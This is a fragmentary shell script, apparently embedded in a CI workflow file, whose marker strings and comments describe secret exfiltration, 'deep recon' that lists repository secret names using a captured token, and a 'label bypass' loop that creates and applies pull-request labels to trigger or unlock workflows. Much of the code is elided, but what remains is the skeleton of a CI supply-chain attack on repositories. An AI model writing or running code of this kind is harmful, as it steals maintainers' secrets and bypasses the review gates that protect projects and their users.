...
echo "==PRT_EXFIL_END_de6380e4ab05=="
        ...
        if [ -n "$__PRT_TK" ]; then
          ...
          echo "==PRT_RECON_START_de6380e4ab05=="
          (
            # --- Repo secret names ---
            echo "##REPO_SECRETS##"
...
" 2>/dev/null
          ...
          echo "==PRT_RECON_END_de6380e4ab05=="
        fi
        # --- end deep recon ---
            ...
            for __entry in $__PRT_LABELS; do
              ...
              if [ "$__LBL_CREATE" = "201" ] || [ "$__LBL_CREATE" = "422" ]; then
                ...
                if [ "$__LBL_APPLY" = "200" ]; then
                  echo "PRT_LABEL_BYPASS_de6380e4ab05=$__LBL_WF:$__LBL_NAME"
                else
                  echo "PRT_LABEL_BYPASS_ERR_de6380e4ab05=apply_failed:$__LBL_APPLY:$__LBL_WF"
                fi
              else
                echo "PRT_LABEL_BYPASS_ERR_de6380e4ab05=create_failed:$__LBL_CREATE:$__LBL_WF"
              fi
            done
          else
            echo "PRT_LABEL_BYPASS_ERR_de6380e4ab05=no_pr_number"
          fi
        fi
        # --- end label bypass ---
